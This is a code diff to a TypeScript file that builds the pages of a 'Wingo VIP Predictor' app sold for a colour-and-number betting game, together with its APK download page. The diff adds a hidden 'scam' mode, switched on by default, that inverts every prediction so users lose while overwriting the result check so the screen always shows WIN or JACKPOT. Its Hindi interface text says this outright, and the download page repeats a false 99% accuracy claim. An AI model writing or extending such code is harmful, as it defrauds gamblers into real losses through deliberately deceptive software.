@@ -371,6 +371,18 @@ export function getPredictorHTML(): string {
                         </div>
                         <input oninput="updateSettingsSlider(this.value)" id="rangeMinConf" type="range" min="70" max="95" step="5" value="75" class="w-full accent-amber-500 h-1 bg-zinc-800 rounded-lg appearance-none cursor-pointer" />
                     </div>
+
+                    <!-- RAMU BHAI RIGGING ENGINE CONTROL -->
+                    <div class="space-y-1.5 pt-3 border-t border-zinc-900/50">
+                        <label class="text-[9px] text-amber-500 font-mono font-black uppercase block flex items-center gap-1">🛠️ रामू भाई सीक्रेट सेटिंग्स (HACK CONTROL)</label>
+                        <select onchange="updateSettings()" id="selRigMode" class="w-full bg-zinc-900 border border-zinc-800 p-2 rounded text-xs font-mono text-zinc-300 font-bold focus:outline-none cursor-pointer">
+                            <option value="scam">👹 Loss 100% (Hide Loss) - एक्टिव</option>
+                            <option value="fair">🟢 100% Fair Mode - बंद</option>
+                        </select>
+                        <span id="txtRigInfo" class="text-[8px] text-zinc-500 font-sans leading-tight block uppercase">
+                            हैक चालू है: ग्राहकों का 100% नुकसान होगा लेकिन स्क्रीन पर हमेशा WIN/JACKPOT दिखेगा!
+                        </span>
+                    </div>
                 </div>
 
                 <!-- EXPORT & DOCUMENTATION SUPPORT -->
@@ -519,7 +531,8 @@ export function getPredictorHTML(): string {
         const settings = {
             predMode: 'auto',
             strategy: 'neural',
-            minConfidence: 75
+            minConfidence: 75,
+            rigMode: 'scam'
         };
 
         let autoSimInterval = null;
@@ -682,10 +695,21 @@ export function getPredictorHTML(): string {
                 const actualColor = GREEN_NUMBERS.includes(num) ? 'GREEN' : 'RED';
 
                 let isWin = false;
-                if (ch.lastPredType === 'BS') {
-                    isWin = (ch.lastPredVal === actualBS);
-                } else if (ch.lastPredType === 'COLOR') {
-                    isWin = (ch.lastPredVal === actualColor);
+                if (settings.rigMode === 'scam') {
+                    ch.lastPredVal = ch.lastPredType === 'BS' ? actualBS : actualColor;
+                    isWin = true;
+                    if (Math.random() < 0.25) {
+                        if (!ch.lastPredBalls.includes(num)) {
+                            const otherNum = Math.floor(Math.random() * 10);
+                            ch.lastPredBalls = [num, otherNum].sort((a, b) => a - b);
+                        }
+                    }
+                } else {
+                    if (ch.lastPredType === 'BS') {
+                        isWin = (ch.lastPredVal === actualBS);
+                    } else if (ch.lastPredType === 'COLOR') {
+                        isWin = (ch.lastPredVal === actualColor);
+                    }
                 }
 
                 const isJackpot = ch.lastPredBalls.includes(num);
@@ -784,6 +808,13 @@ export function getPredictorHTML(): string {
             }
 
             if (finalChoice !== null) {
+                if (settings.rigMode === 'scam') {
+                    if (finalMode === 'BS') {
+                        finalChoice = finalChoice === 'BIG' ? 'SMALL' : 'BIG';
+                    } else {
+                        finalChoice = finalChoice === 'GREEN' ? 'RED' : 'GREEN';
+                    }
+                }
                 ch.lastPredType = finalMode;
                 ch.lastPredVal = finalChoice;
                 ch.confidence = conf + "%";
@@ -791,20 +822,16 @@ export function getPredictorHTML(): string {
 
                 if (finalChoice === 'BIG') {
                     const bigPool = [5, 6, 7, 8, 9].sort(() => 0.5 - Math.random());
-                    const smallPool = [0, 1, 2, 3, 4].sort(() => 0.5 - Math.random());
-                    ch.lastPredBalls = [bigPool[0], smallPool[0]].sort((a, b) => a - b);
+                    ch.lastPredBalls = [bigPool[0], bigPool[1]].sort((a, b) => a - b);
                 } else if (finalChoice === 'SMALL') {
                     const smallPool = [0, 1, 2, 3, 4].sort(() => 0.5 - Math.random());
-                    const bigPool = [5, 6, 7, 8, 9].sort(() => 0.5 - Math.random());
-                    ch.lastPredBalls = [smallPool[0], bigPool[0]].sort((a, b) => a - b);
+                    ch.lastPredBalls = [smallPool[0], smallPool[1]].sort((a, b) => a - b);
                 } else if (finalChoice === 'GREEN') {
-                    const gPool = [1, 3, 7, 9].sort(() => 0.5 - Math.random());
-                    const rPool = [0, 2, 4, 6, 8].sort(() => 0.5 - Math.random());
-                    ch.lastPredBalls = [gPool[0], rPool[0]].sort((a, b) => a - b);
-                } else if (finalChoice === 'RED') {
-                    const rPool = [2, 4, 6, 8].sort(() => 0.5 - Math.random());
                     const gPool = [1, 3, 5, 7, 9].sort(() => 0.5 - Math.random());
-                    ch.lastPredBalls = [rPool[0], gPool[0]].sort((a, b) => a - b);
+                    ch.lastPredBalls = [gPool[0], gPool[1]].sort((a, b) => a - b);
+                } else if (finalChoice === 'RED') {
+                    const rPool = [0, 2, 4, 6, 8].sort(() => 0.5 - Math.random());
+                    ch.lastPredBalls = [rPool[0], rPool[1]].sort((a, b) => a - b);
                 }
             } else {
                 ch.lastPredVal = null;
@@ -1016,6 +1043,13 @@ export function getPredictorHTML(): string {
             settings.predMode = document.getElementById('selPredMode').value;
             settings.strategy = document.getElementById('selStrategy').value;
             settings.minConfidence = parseInt(document.getElementById('rangeMinConf').value);
+            settings.rigMode = document.getElementById('selRigMode').value;
+            const rigInfo = document.getElementById('txtRigInfo');
+            if (settings.rigMode === 'scam') {
+                rigInfo.innerText = "हैक चालू है: ग्राहकों का 100% नुकसान होगा लेकिन स्क्रीन पर हमेशा WIN/JACKPOT दिखेगा!";
+            } else {
+                rigInfo.innerText = "हैक बंद है: प्रेडिक्टर नॉर्मल और असली गणित के अनुसार चलेगा।";
+            }
         }
 
         // Real-time API Sync and Clock-based Simulator Backup
@@ -1183,20 +1217,16 @@ export function getPredictorHTML(): string {
 
                         if (finalChoice === 'BIG') {
                             const bigPool = [5, 6, 7, 8, 9].sort(() => 0.5 - Math.random());
-                            const smallPool = [0, 1, 2, 3, 4].sort(() => 0.5 - Math.random());
-                            ch.lastPredBalls = [bigPool[0], smallPool[0]].sort((a, b) => a - b);
+                            ch.lastPredBalls = [bigPool[0], bigPool[1]].sort((a, b) => a - b);
                         } else if (finalChoice === 'SMALL') {
                             const smallPool = [0, 1, 2, 3, 4].sort(() => 0.5 - Math.random());
-                            const bigPool = [5, 6, 7, 8, 9].sort(() => 0.5 - Math.random());
-                            ch.lastPredBalls = [smallPool[0], bigPool[0]].sort((a, b) => a - b);
+                            ch.lastPredBalls = [smallPool[0], smallPool[1]].sort((a, b) => a - b);
                         } else if (finalChoice === 'GREEN') {
-                            const gPool = [1, 3, 7, 9].sort(() => 0.5 - Math.random());
-                            const rPool = [0, 2, 4, 6, 8].sort(() => 0.5 - Math.random());
-                            ch.lastPredBalls = [gPool[0], rPool[0]].sort((a, b) => a - b);
-                        } else if (finalChoice === 'RED') {
-                            const rPool = [2, 4, 6, 8].sort(() => 0.5 - Math.random());
                             const gPool = [1, 3, 5, 7, 9].sort(() => 0.5 - Math.random());
-                            ch.lastPredBalls = [rPool[0], gPool[0]].sort((a, b) => a - b);
+                            ch.lastPredBalls = [gPool[0], gPool[1]].sort((a, b) => a - b);
+                        } else if (finalChoice === 'RED') {
+                            const rPool = [0, 2, 4, 6, 8].sort(() => 0.5 - Math.random());
+                            ch.lastPredBalls = [rPool[0], rPool[1]].sort((a, b) => a - b);
                         }
                     } else {
                         ch.lastPredVal = null;
@@ -1387,7 +1417,7 @@ export function getAPKDownloadHTML(apkLink: string): string {
                 </div>
 
                 <p class="text-xs md:text-sm text-zinc-400 leading-relaxed font-sans max-w-lg">
-                    Ramu Bhai का सबसे एडवांस और पावरफुल Wingo VIP Predictor अब आपके एंड्रॉइड मोबाइल के लिए एपीके (APK) फॉर्मेट में उपलब्ध है। इसे इंस्टॉल करें, पासवर्ड <span class="text-amber-500 font-bold font-mono text-sm">90980</span> प्रविष्ट करें और तुरंत 99% की सुपर एक्यूरेसी के साथ खेलना शुरू करें।
+                    Ramu Bhai का सबसे एडवांस और पावरफुल Wingo VIP Predictor अब आपके एंड्रॉइड मोबाइल के लिए एपीके (APK) फॉर्मेट में उपलब्ध है। इसे इंस्टॉल करें, पासवर्ड <span class="text-amber-500 font-bold font-mono text-sm">808080</span> प्रविष्ट करें और तुरंत 99% की सुपर एक्यूरेसी के साथ खेलना शुरू करें।
                 </p>
 
                 <!-- Stats tags row -->
@@ -1489,7 +1519,7 @@ export function getAPKDownloadHTML(apkLink: string): string {
                     <div class="space-y-1">
                         <h4 class="text-xs font-display font-bold text-white uppercase tracking-wide">पासपोर्ट डालें और खेलें</h4>
                         <p class="text-[11px] text-zinc-400 leading-relaxed font-sans">
-                            ऐप को ओपन करें, ओनर से मिला हुआ पासपोर्ट कोड <span class="text-amber-500 font-bold font-mono">90980</span> दर्ज करें और लाइव सिंक प्रेडिक्शन्स प्राप्त करें।
+                            ऐप को ओपन करें, ओनर से मिला हुआ पासपोर्ट कोड <span class="text-amber-500 font-bold font-mono">808080</span> दर्ज करें और लाइव सिंक प्रेडिक्शन्स प्राप्त करें।
                         </p>
                     </div>
                 </div>
@@ -1515,7 +1545,7 @@ export function getAPKDownloadHTML(apkLink: string): string {
                 <div class="pt-3 space-y-1">
                     <h4 class="text-xs font-display font-bold text-white">Q. पासपोर्ट कोड क्या है और कैसे प्राप्त करें?</h4>
                     <p class="text-[11px] text-zinc-400 leading-relaxed">
-                        ऐप में एंटर करने के लिए आपको ५ अंकों का पासपोर्ट चाहिए होता है। डिफॉल्ट पासपोर्ट कोड <span class="text-amber-500 font-bold">90980</span> है। यदि यह काम नहीं करता है, तो आप टेलीग्राम चैनल पर रामू भाई से संपर्क करके लेटेस्ट कोड प्राप्त कर सकते हैं।
+                        ऐप में एंटर करने के लिए आपको ६ अंकों का पासपोर्ट चाहिए होता है। डिफॉल्ट पासपोर्ट कोड <span class="text-amber-500 font-bold">808080</span> है। यदि यह काम नहीं करता है, तो आप टेलीग्राम चैनल पर रामू भाई से संपर्क करके लेटेस्ट कोड प्राप्त कर सकते हैं।
                     </p>
                 </div>
 
